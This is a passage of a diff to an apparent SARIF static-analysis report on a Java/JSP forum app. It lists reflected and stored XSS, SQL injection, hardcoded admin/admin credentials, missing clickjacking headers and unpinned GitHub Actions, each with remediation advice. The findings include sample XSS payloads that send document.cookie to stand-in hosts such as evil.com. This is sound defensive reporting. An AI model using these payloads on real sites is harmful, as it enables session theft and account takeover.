class=\"field\"&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"control has-icons-left\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input name=\"username\" class=\"input is-large\" type=\"text\"</pre><h3>Remediation</h3>Replace the bare EL expression with JSTL's HTML-encoding output tag:\\n``<code>jsp\\n&lt;p class=\\\"subtitle has-text-danger\\\"&gt;\\n    Authentication failed for user &lt;c:out value=\\\"${prefillUsername}\\\"/&gt;, please retry\\n&lt;/p&gt;\\n</code>`<code>\\n</code>&lt;c:out&gt;<code> HTML-encodes </code>&lt;<code>, </code>&gt;<code>, </code>\\\"<code>, </code>'<code>, and </code>&amp;` by default, preventing injection into both HTML text and attribute contexts.",
+            "markdown": "The JSP EL expression `${prefillUsername}` is interpolated directly into HTML text content on line 14 without any HTML encoding. The value is sourced from the `username` URL query parameter (`/auth/login?username=...`) — fully attacker-controlled — and placed into the page by `AuthenticationController.login()` via `request.setAttribute(\"prefillUsername\", username)` with no sanitization.\\n\\nAn attacker can craft a URL such as:\\n```\\n/auth/login?username=<script>document.location='https://evil.example/steal?c='+document.cookie</script>\\n```\\nWhen the victim follows this link, the browser executes the injected script in the context of the forum's origin, enabling session cookie theft, phishing overlays, credential harvesting, and more.\\n\\nJSP EL expressions (`${}`) do **not** HTML-encode their output by default; JSTL's `<c:out>` or explicit encoding is required."
           },
           "locations": [
             {
@@ -310,323 +394,51 @@
             "impact": 4,
             "likelihood": 4.5,
             "snippetStartLine": 9,
-            "summary": "Reflected XSS via unescaped ${prefillUsername} in error message paragraph",
-            "remediationSummary": "Use &lt;c:out value=\"${prefillUsername}\"/&gt; or fn:escapeXml() instead of bare ${prefillUsername} to HTML-encode the reflected value.",
-            "remediation": "Replace the raw EL expression with JSTL's `<c:out>`, which HTML-encodes by default:\n\n```jsp\n<p class=\"subtitle has-text-danger\">\n    Authentication failed for user <c:out value=\"${prefillUsername}\"/>, please retry\n</p>\n```\n\nAlternatively use the JSTL functions tag library: `${fn:escapeXml(prefillUsername)}`. Also consider URL-encoding the username when building the redirect in `AuthenticationController` to avoid injecting special characters into the redirect URL itself."
+            "summary": "User-controlled ${prefillUsername} is reflected into HTML text content without encoding, enabling reflected XSS.",
+            "remediationSummary": "Replace ${prefillUsername} with &lt;c:out value=\"${prefillUsername}\"/&gt; to HTML-encode user-controlled output in HTML text context.",
+            "remediation": "Replace the bare EL expression with JSTL's HTML-encoding output tag:\\n```jsp\\n<p class=\\\"subtitle has-text-danger\\\">\\n    Authentication failed for user <c:out value=\\\"${prefillUsername}\\\"/>, please retry\\n</p>\\n```\\n`<c:out>` HTML-encodes `<`, `>`, `\\\"`, `'`, and `&` by default, preventing injection into both HTML text and attribute contexts."
           }
         },
         {
-          "ruleId": "cross-site-scripting/reflected",
-          "level": "error",
+          "ruleId": "build-misconfiguration",
+          "level": "note",
           "message": {
-            "text": "The EL expression <code>${prefillUsername}</code> is written verbatim into the <code>value</code> attribute of the username <code>&lt;input&gt;</code> element on line 20. Because JSP EL does not HTML-encode, an attacker-controlled username value can break out of the attribute context:<pre>/auth/login?username=\"&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</pre>This closes the <code>value=\"...\"</code> attribute, closes the <code>&lt;input&gt;</code> tag, and injects arbitrary HTML/JavaScript. The data flow is the same as for line 14: the HTTP query parameter flows through <code>AuthenticationController</code> → <code>request.setAttribute(\"prefillUsername\", username)</code> → JSP output with no encoding.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/auth/login.jsp</code><pre>15&nbsp;|&nbsp;&lt;/c:if&gt;\n16&nbsp;|&nbsp;&lt;div class=\"box\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"field\"&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"control has-icons-left\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input name=\"username\" class=\"input is-large\" type=\"text\"\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;placeholder=\"Username\" autofocus=\"\" value=\"${prefillUsername}\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;span class=\"icon is-large is-left\"&gt;\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i class=\"fas fa-user\"&gt;&lt;/i&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/span&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;</pre><h3>Remediation</h3>Replace the bare EL expression in the <code>value</code> attribute with JSTL <code>&lt;c:out&gt;</code> (which also works in attribute position) or the <code>fn:escapeXml()</code> function:<pre>&lt;input name=\"username\" class=\"input is-large\" type=\"text\"\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;placeholder=\"Username\" autofocus=\"\"\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value=\"&lt;c:out value='${prefillUsername}'/&gt;\"&gt;</pre>Or, equivalently:<pre>value=\"${fn:escapeXml(prefillUsername)}\"</pre>",
-            "markdown": "The EL expression `${prefillUsername}` is written verbatim into the `value` attribute of the username `<input>` element on line 20. Because JSP EL does not HTML-encode, an attacker-controlled username value can break out of the attribute context:\n\n```\n/auth/login?username=\"><img src=x onerror=alert(document.cookie)>\n```\n\nThis closes the `value=\"...\"` attribute, closes the `<input>` tag, and injects arbitrary HTML/JavaScript. The data flow is the same as for line 14: the HTTP query parameter flows through `AuthenticationController` → `request.setAttribute(\"prefillUsername\", username)` → JSP output with no encoding."
+            "text": "The workflow references every external action by a mutable, floating version tag:\n\n- <code>actions/checkout@v2</code> (line 33)\n- <code>github/codeql-action/init@v1</code> (line 46)\n- <code>github/codeql-action/autobuild@v1</code> (line 57)\n- <code>github/codeql-action/analyze@v1</code> (line ~66)\n\nA version tag such as <code>v1</code> or <code>v2</code> can be silently force-pushed to point to an entirely different commit at any time — either by the action's maintainer (inadvertent breaking change), by an adversary who compromises the maintainer's account, or as a deliberate supply-chain attack. When GitHub executes the workflow it will fetch whatever commit the tag currently resolves to, without any integrity check. Because actions run in the same runner environment as the rest of the workflow they have full access to all GitHub Actions secrets, the <code>GITHUB_TOKEN</code>, and the checked-out repository contents. A malicious action replacement could exfiltrate secrets, inject backdoors into build artifacts, or tamper with code-scanning results.<h3>Affected Code</h3><code>.github/workflows/codeql-analysis.yml</code><pre>28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# Learn more...\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#overriding-automatic-language-detection\n30&nbsp;|&nbsp;\n31&nbsp;|&nbsp;steps:\n32&nbsp;|&nbsp;- name: Checkout repository\n33&nbsp;|&nbsp;&nbsp;&nbsp;uses: actions/checkout@v2\n34&nbsp;|&nbsp;&nbsp;&nbsp;with:\n35&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# We must fetch at least the immediate parents so that if this is\n36&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# a pull request then we can checkout the head.\n37&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fetch-depth: 2</pre><h3>Remediation</h3>Pin every external <code>uses:</code> reference to an <strong>immutable commit SHA</strong> rather than a version tag. For example:<pre>uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2\nuses: github/codeql-action/init@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/autobuild@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3\nuses: github/codeql-action/analyze@ff0a06e83cb2de871e5a09832bc6a81e7276941f  # v3</pre>Keep the human-readable version in a comment. Tooling such as Dependabot (<code>update-config: github-actions</code>) or <code>pin-github-action</code> can automate this and keep the SHAs up to date.",
+            "markdown": "The workflow references every external action by a mutable, floating version tag:\n\n- `actions/checkout@v2` (line 33)\n- `github/codeql-action/init@v1` (line 46)\n- `github/codeql-action/autobuild@v1` (line 57)\n- `github/codeql-action/analyze@v1` (line ~66)\n\nA version tag such as `v1` or `v2` can be silently force-pushed to point to an entirely different commit at any time — either by the action's maintainer (inadvertent breaking change), by an adversary who compromises the maintainer's account, or as a deliberate supply-chain attack. When GitHub executes the workflow it will fetch whatever commit the tag currently resolves to, without any integrity check. Because actions run in the same runner environment as the rest of the workflow they have full access to all GitHub Actions secrets, the `GITHUB_TOKEN`, and the checked-out repository contents. A malicious action replacement could exfiltrate secrets, inject backdoors into build artifacts, or tamper with code-scanning results."
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/auth/login.jsp"
+                  "uri": ".github/workflows/codeql-analysis.yml"
                 },
                 "region": {
-                  "startLine": 20,
+                  "startLine": 33,
                   "snippet": {
-                    "text": "                        </c:if>\n                        <div class=\"box\">\n                            <div class=\"field\">\n                                <div class=\"control has-icons-left\">\n                                    <input name=\"username\" class=\"input is-large\" type=\"text\"\n                                           placeholder=\"Username\" autofocus=\"\" value=\"${prefillUsername}\">\n                                    <span class=\"icon is-large is-left\">\n                                        <i class=\"fas fa-user\"></i>\n                                    </span>\n                                </div>\n                            </div>"
+                    "text": "        # Learn more...\n        # https://docs.github.com/en/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#overriding-automatic-language-detection\n\n    steps:\n    - name: Checkout repository\n      uses: actions/checkout@v2\n      with:\n        # We must fetch at least the immediate parents so that if this is\n        # a pull request then we can checkout the head.\n        fetch-depth: 2\n"
                   }
                 }
               }
             }
           ],
           "fingerprints": {
-            "fortify/instance-id": "AB6FF6B2B45E91E57A6436079A12D4AC"
+            "fortify/instance-id": "4262858276DE7B69FFC9D6663C2F4FB1"
           },
           "properties": {
-            "impact": 4,
-            "likelihood": 4.5,
-            "snippetStartLine": 15,
-            "summary": "Reflected XSS via unescaped ${prefillUsername} in input value attribute enabling attribute breakout",
-            "remediationSummary": "Use &lt;c:out&gt; or fn:escapeXml() on ${prefillUsername} used in the input value attribute to prevent attribute-breakout XSS.",
-            "remediation": "Replace the bare EL expression in the `value` attribute with JSTL `<c:out>` (which also works in attribute position) or the `fn:escapeXml()` function:\n\n```jsp\n<input name=\"username\" class=\"input is-large\" type=\"text\"\n       placeholder=\"Username\" autofocus=\"\"\n       value=\"<c:out value='${prefillUsername}'/>\">\n```\nOr, equivalently:\n```jsp\nvalue=\"${fn:escapeXml(prefillUsername)}\"\n```"
-          }
-        },
-        {
-          "ruleId": "password-management/hardcoded-password",
-          "level": "error",
-          "message": {
-            "text": "The migration script hard-codes three user accounts with trivially guessable credentials where every password is identical to the username:<pre>VALUES\n&nbsp;&nbsp;('admin', 'admin'),   -- line 10\n&nbsp;&nbsp;('eddy',  'eddy'),    -- line 11\n&nbsp;&nbsp;('john',  'john');    -- line 12</pre>Of particular concern is the <strong>admin</strong> account, whose credential <code>admin/admin</code> is one of the most-attacked username/password combinations in the world. Because these accounts are created automatically by the Flyway migration, they exist in every deployment of the application unless explicitly removed — including production deployments. An unauthenticated attacker can log in immediately and gain full forum access (including message posting under the <code>admin</code> identity) with no effort.<h3>Affected Code</h3><code>src/main/resources/db/migration/V1__init.sql</code><pre>&nbsp;5&nbsp;|&nbsp;);\n&nbsp;6&nbsp;|&nbsp;\n&nbsp;7&nbsp;|&nbsp;INSERT INTO users\n&nbsp;8&nbsp;|&nbsp;&nbsp;&nbsp;(username, password)\n&nbsp;9&nbsp;|&nbsp;VALUES\n10&nbsp;|&nbsp;&nbsp;&nbsp;('admin', 'admin'),\n11&nbsp;|&nbsp;&nbsp;&nbsp;('eddy', 'eddy'),\n12&nbsp;|&nbsp;&nbsp;&nbsp;('john', 'john');\n13&nbsp;|&nbsp;\n14&nbsp;|&nbsp;CREATE TABLE messages (\n15&nbsp;|&nbsp;&nbsp;&nbsp;id BIGINT AUTO_INCREMENT,</pre><h3>Remediation</h3>1. <strong>Remove all hard-coded default accounts</strong> from the migration. Do not seed any user rows whose credentials are checked into source control.\n2. If seed accounts are needed for development/testing, supply them via <strong>environment-specific configuration</strong> (e.g. a separate <code>V1__seed_dev.sql</code> migration applied only in non-production profiles, or values injected from a secrets manager at deploy time).\n3. Enforce a <strong>strong-password policy</strong> at the application layer so that any programmatically created account must use a complex, unique password.\n4. Remove or disable the <code>admin</code> account in any production deployment and implement a proper first-run account-creation workflow.",
-            "markdown": "The migration script hard-codes three user accounts with trivially guessable credentials where every password is identical to the username:\n\n```sql\nVALUES\n  ('admin', 'admin'),   -- line 10\n  ('eddy',  'eddy'),    -- line 11\n  ('john',  'john');    -- line 12\n```\n\nOf particular concern is the **admin** account, whose credential `admin/admin` is one of the most-attacked username/password combinations in the world. Because these accounts are created automatically by the Flyway migration, they exist in every deployment of the application unless explicitly removed — including production deployments. An unauthenticated attacker can log in immediately and gain full forum access (including message posting under the `admin` identity) with no effort."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/resources/db/migration/V1__init.sql"
-                },
-                "region": {
-                  "startLine": 10,
-                  "snippet": {
-                    "text": ");\n\nINSERT INTO users\n  (username, password)\nVALUES\n  ('admin', 'admin'),\n  ('eddy', 'eddy'),\n  ('john', 'john');\n\nCREATE TABLE messages (\n  id BIGINT AUTO_INCREMENT,"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "75116853BA208F123BCABE61D460C5AA"
-          },
-          "properties": {
-            "impact": 4,
-            "likelihood": 4.5,
-            "snippetStartLine": 5,
-            "summary": "Three user accounts with trivially guessable credentials (including admin/admin) are hard-coded in the database migration script.",
-            "remediationSummary": "Remove hard-coded default credentials from the migration script; provision accounts through out-of-band, environment-specific secret management.",
-            "remediation": "1. **Remove all hard-coded default accounts** from the migration. Do not seed any user rows whose credentials are checked into source control.\n2. If seed accounts are needed for development/testing, supply them via **environment-specific configuration** (e.g. a separate `V1__seed_dev.sql` migration applied only in non-production profiles, or values injected from a secrets manager at deploy time).\n3. Enforce a **strong-password policy** at the application layer so that any programmatically created account must use a complex, unique password.\n4. Remove or disable the `admin` account in any production deployment and implement a proper first-run account-creation workflow."
-          }
-        },
-        {
-          "ruleId": "cross-site-scripting/persistent",
-          "level": "error",
-          "message": {
-            "text": "The EL expression <code>${msg.subject}</code> on line 19 of <code>list.jsp</code> writes the message subject directly into an <code>&lt;h4&gt;</code> element without HTML encoding. The subject is stored in the database via <code>MessageDAO.post()</code>, which concatenates unvalidated user input directly into an <code>INSERT</code> SQL statement:<pre>jdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) VALUES ('\"\n&nbsp;&nbsp;&nbsp;&nbsp;+ author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");</pre>An attacker who submits a message with a subject like:<pre>&lt;script&gt;fetch('https://evil.com/?c='+document.cookie)&lt;/script&gt;</pre>will have that payload rendered unescaped in every visitor's browser when they navigate to the message list. Because the payload persists in the database and is served to <strong>every</strong> user who loads the list, this is a persistent (stored) XSS vulnerability affecting all forum users.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/list.jsp</code><pre>14&nbsp;|&nbsp;&lt;div class=\"column is-9\"&gt;\n15&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"box content\"&gt;\n16&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;c:forEach items=\"${messages}\" var=\"msg\"&gt;\n17&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;article&gt;\n18&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;a href=\"./read/${msg.id}\"&gt;\n19&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;h4&gt;${msg.subject}&lt;/h4&gt;\n20&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media\"&gt;\n21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-left\"&gt;\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i class=\"fab fa-readme\"&gt;&lt;/i&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;</pre><h3>Remediation</h3>Wrap the EL expression with JSTL's <code>&lt;c:out&gt;</code> or <code>fn:escapeXml()</code>:<pre>&lt;h4&gt;&lt;c:out value=\"${msg.subject}\"/&gt;&lt;/h4&gt;</pre>Apply the same escaping to every other user-supplied field rendered in the template. Also fix the SQL injection vulnerability in <code>MessageDAO.post()</code> by using a parameterised <code>PreparedStatement</code> or <code>jdbcTemplate.update()</code> with <code>?</code> placeholders.",
-            "markdown": "The EL expression `${msg.subject}` on line 19 of `list.jsp` writes the message subject directly into an `<h4>` element without HTML encoding. The subject is stored in the database via `MessageDAO.post()`, which concatenates unvalidated user input directly into an `INSERT` SQL statement:\n\n```java\njdbcTemplate.execute(\"INSERT INTO messages(author, subject, body, timestamp) VALUES ('\"\n    + author + \"', '\" + subject + \"', '\" + body + \"', NOW())\");\n```\n\nAn attacker who submits a message with a subject like:\n```\n<script>fetch('https://evil.com/?c='+document.cookie)</script>\n```\nwill have that payload rendered unescaped in every visitor's browser when they navigate to the message list. Because the payload persists in the database and is served to **every** user who loads the list, this is a persistent (stored) XSS vulnerability affecting all forum users."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/messages/list.jsp"
-                },
-                "region": {
-                  "startLine": 19,
-                  "snippet": {
-                    "text": "                <div class=\"column is-9\">\n                    <div class=\"box content\">\n                        <c:forEach items=\"${messages}\" var=\"msg\">\n                                <article>\n                                    <a href=\"./read/${msg.id}\">\n                                        <h4>${msg.subject}</h4>\n                                        <div class=\"media\">\n                                            <div class=\"media-left\">\n                                                <i class=\"fab fa-readme\"></i>\n                                            </div>\n                                            <div class=\"media-content\">"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "7FB75AE1005C830DC71ECD90B75C4BC2"
-          },
-          "properties": {
-            "impact": 4.5,
-            "likelihood": 4.5,
-            "snippetStartLine": 14,
-            "summary": "Stored XSS: unescaped ${msg.subject} in message list renders attacker-controlled HTML to all visitors",
-            "remediationSummary": "Replace ${msg.subject} with &lt;c:out value=\"${msg.subject}\"/&gt; to HTML-encode stored message subjects before rendering.",
-            "remediation": "Wrap the EL expression with JSTL's `<c:out>` or `fn:escapeXml()`:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n```\n\nApply the same escaping to every other user-supplied field rendered in the template. Also fix the SQL injection vulnerability in `MessageDAO.post()` by using a parameterised `PreparedStatement` or `jdbcTemplate.update()` with `?` placeholders."
-          }
-        },
-        {
-          "ruleId": "cross-site-scripting/persistent",
-          "level": "error",
-          "message": {
-            "text": "The EL expression <code>${msg.author}</code> on line 26 of <code>list.jsp</code> is rendered directly into the HTML body without encoding. The <code>author</code> field is taken from the <code>user</code> cookie value at message-post time (<code>@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user</code> in <code>MessageController.composeSubmit()</code>). Since the <code>user</code> cookie is set to the raw username string with no sanitisation and no <code>HttpOnly</code> flag, an attacker can:\n\n1. Register or set their <code>user</code> cookie to a value containing a JavaScript payload, e.g.:\n   <pre>&nbsp;&nbsp;&nbsp;&lt;img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\"&gt;\n&nbsp;&nbsp;&nbsp;</pre>2. Submit a message. The payload is stored in the <code>author</code> column via the SQL <code>INSERT</code>.\n3. Every user who subsequently loads the message list page receives and executes the stored script.\n\n<code>${msg.timestamp}</code> on the same line is server-generated and not directly attacker-controlled, but <code>${msg.author}</code> is fully attacker-controlled.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/views/messages/list.jsp</code><pre>21&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-left\"&gt;\n22&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;i class=\"fab fa-readme\"&gt;&lt;/i&gt;\n23&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n24&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"media-content\"&gt;\n25&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;div class=\"content\"&gt;\n26&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by ${msg.author} on ${msg.timestamp}\n27&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n28&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n29&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;\n30&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/a&gt;\n31&nbsp;|&nbsp;&lt;/article&gt;</pre><h3>Remediation</h3>Encode all user-sourced fields with <code>&lt;c:out&gt;</code> or <code>fn:escapeXml()</code>:<pre>by &lt;c:out value=\"${msg.author}\"/&gt; on &lt;c:out value=\"${msg.timestamp}\"/&gt;</pre>Additionally:\n- Sanitise the username at registration/login time so it cannot contain HTML characters.\n- Set the <code>user</code> cookie with <code>HttpOnly</code> and <code>Secure</code> flags in <code>AuthenticationController.setCookie()</code>.\n- Fix the SQL injection in <code>MessageDAO.post()</code> using parameterised queries.",
-            "markdown": "The EL expression `${msg.author}` on line 26 of `list.jsp` is rendered directly into the HTML body without encoding. The `author` field is taken from the `user` cookie value at message-post time (`@CookieValue(value = \"user\", defaultValue = \"anonymous\") String user` in `MessageController.composeSubmit()`). Since the `user` cookie is set to the raw username string with no sanitisation and no `HttpOnly` flag, an attacker can:\n\n1. Register or set their `user` cookie to a value containing a JavaScript payload, e.g.:\n   ```\n   <img src=x onerror=\"document.location='https://evil.com/?c='+document.cookie\">\n   ```\n2. Submit a message. The payload is stored in the `author` column via the SQL `INSERT`.\n3. Every user who subsequently loads the message list page receives and executes the stored script.\n\n`${msg.timestamp}` on the same line is server-generated and not directly attacker-controlled, but `${msg.author}` is fully attacker-controlled."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "src/main/webapp/WEB-INF/views/messages/list.jsp"
-                },
-                "region": {
-                  "startLine": 26,
-                  "snippet": {
-                    "text": "                                            <div class=\"media-left\">\n                                                <i class=\"fab fa-readme\"></i>\n                                            </div>\n                                            <div class=\"media-content\">\n                                                <div class=\"content\">\n                                                    by ${msg.author} on ${msg.timestamp}\n                                                </div>\n                                            </div>\n                                        </div>\n                                    </a>\n                                </article>"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "fortify/instance-id": "3C8BB7B76273D76C70F3B01E6B93DE4E"
-          },
-          "properties": {
-            "impact": 4.5,
-            "likelihood": 4,
-            "snippetStartLine": 21,
-            "summary": "Stored XSS: unescaped ${msg.author} in message list renders attacker-controlled cookie value as HTML to all visitors",
-            "remediationSummary": "Replace ${msg.author} with &lt;c:out value=\"${msg.author}\"/&gt; to HTML-encode the cookie-sourced author field before rendering.",
-            "remediation": "Encode all user-sourced fields with `<c:out>` or `fn:escapeXml()`:\n\n```jsp\nby <c:out value=\"${msg.author}\"/> on <c:out value=\"${msg.timestamp}\"/>\n```\n\nAdditionally:\n- Sanitise the username at registration/login time so it cannot contain HTML characters.\n- Set the `user` cookie with `HttpOnly` and `Secure` flags in `AuthenticationController.setCookie()`.\n- Fix the SQL injection in `MessageDAO.post()` using parameterised queries."
-          }
-        },
-        {
-          "ruleId": "html5",
-          "level": "error",
-          "message": {
-            "text": "<code>pagetemplate.tag</code> renders the outer HTML frame for every page in the application. It does not emit any <code>X-Frame-Options</code> HTTP response header, nor does it include a <code>Content-Security-Policy: frame-ancestors</code> directive (either as an HTTP header or a <code>&lt;meta http-equiv&gt;</code> tag in <code>&lt;head&gt;</code>).\n\nNo HTTP response filter in the project sets these headers either (<code>AuthenticationFilter</code> only manages authentication state; no other servlet filter is present).\n\nBecause no framing restriction is in place, an attacker can embed any page of the forum inside an <code>&lt;iframe&gt;</code> on a malicious site and conduct UI-redressing (clickjacking) attacks — for example, tricking an authenticated user into submitting the compose-post form by overlaying transparent interface elements, or hijacking a login form to steal credentials.<h3>Affected Code</h3><code>src/main/webapp/WEB-INF/tags/pagetemplate.tag</code><pre>1&nbsp;|&nbsp;&lt;%@tag description=\"Main page template\" pageEncoding=\"UTF-8\"%&gt;\n2&nbsp;|&nbsp;&lt;%@taglib prefix=\"c\" uri=\"http://java.sun.com/jsp/jstl/core\"%&gt;\n3&nbsp;|&nbsp;&lt;html&gt;\n4&nbsp;|&nbsp;&lt;head&gt;\n5&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta charset=\"utf-8\"&gt;\n6&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta http-equiv=\"X-UA-Compatible\" 